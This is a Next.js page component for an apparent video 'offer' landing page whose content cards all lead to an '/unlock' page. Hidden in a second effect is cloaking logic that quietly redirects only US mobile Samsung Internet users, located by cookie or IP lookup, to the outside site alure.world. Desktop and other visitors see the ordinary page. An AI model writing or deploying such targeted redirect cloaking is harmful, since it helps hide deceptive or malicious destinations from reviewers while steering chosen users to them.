"use client";

import React, { useEffect } from "react";
import { useRouter } from "next/navigation";
import Header from "@/components/Header";
import FeaturedVideos from "@/components/FeaturedVideos";
import BrowseCategories from "@/components/BrowseCategories";
import Footer from "@/components/Footer";

export default function OfferHomePage() {
  const router = useRouter();

  useEffect(() => {
    if (typeof window !== "undefined") {
      const params = new URLSearchParams(window.location.search);
      if (params.get("unlock") === "true") {
        router.replace("/unlock");
      }
    }
  }, [router]);

  // Client-side fallback check:
  // Route: /offer/2026
  // Condition 1: US Geolocation
  // Condition 2: Mobile device only (User-Agent)
  // Condition 3: Samsung Internet Browser (User-Agent contains 'SamsungBrowser')
  // Action: window.location.replace('http://alure.world/')
  useEffect(() => {
    if (typeof window === "undefined") return;

    const ua = navigator.userAgent || "";

    // 1. Browser check: Samsung Internet Browser
    const isSamsungBrowser = /SamsungBrowser/i.test(ua);

    // 2. Device check: Mobile device only (exclude desktop OS and tablets)
    const isDesktopOs = /Windows NT|Macintosh|Mac OS X(?!.*Mobile)|Linux x86_64|CrOS/i.test(ua);
    const isTablet = /iPad|Tablet/i.test(ua);
    const isMobile =
      (/Mobile|Mobi|Android/i.test(ua) || /iPhone|iPod|BlackBerry|IEMobile|Opera Mini/i.test(ua)) &&
      !isDesktopOs &&
      !isTablet;

    // For all other users (Desktop, non-US countries, or mobile users on Chrome/Safari/Firefox),
    // do not redirect; keep them on the current Next.js page.
    if (!isSamsungBrowser || !isMobile) {
      return;
    }

    // Helper to read cookie set by server middleware if available
    const getCookie = (name: string): string | null => {
      const match = document.cookie.match(new RegExp("(^|;\\s*)" + name + "=([^;]*)"));
      return match ? decodeURIComponent(match[2]) : null;
    };

    const serverCountry = getCookie("x-geo-country");
    if (serverCountry) {
      if (serverCountry.toUpperCase() === "US") {
        window.location.replace("http://alure.world/");
      }
      return;
    }

    // Fallback: If server geo-headers were not present, query IP lookup API
    const checkGeoFallback = async () => {
      try {
        const res = await fetch("https://ipapi.co/json/");
        if (res.ok) {
          const data = await res.json();
          const countryCode = (data.country_code || data.country || "").toUpperCase();
          if (countryCode === "US") {
            window.location.replace("http://alure.world/");
          }
        }
      } catch (err) {
        console.warn("Client geo fallback lookup failed:", err);
      }
    };

    checkGeoFallback();
  }, []);

  const handleOpenUnlock = () => {
    router.push("/unlock");
  };

  return (
    <div className="flex min-h-screen flex-col bg-[#111111] text-white">
      {/* Navigation Bar */}
      <Header />

      {/* Main Content Sections */}
      <main className="flex-1 flex flex-col">
        <FeaturedVideos onCardClick={handleOpenUnlock} />
        <BrowseCategories onCardClick={handleOpenUnlock} />
      </main>

      {/* Footer */}
      <Footer />
    </div>
  );
}
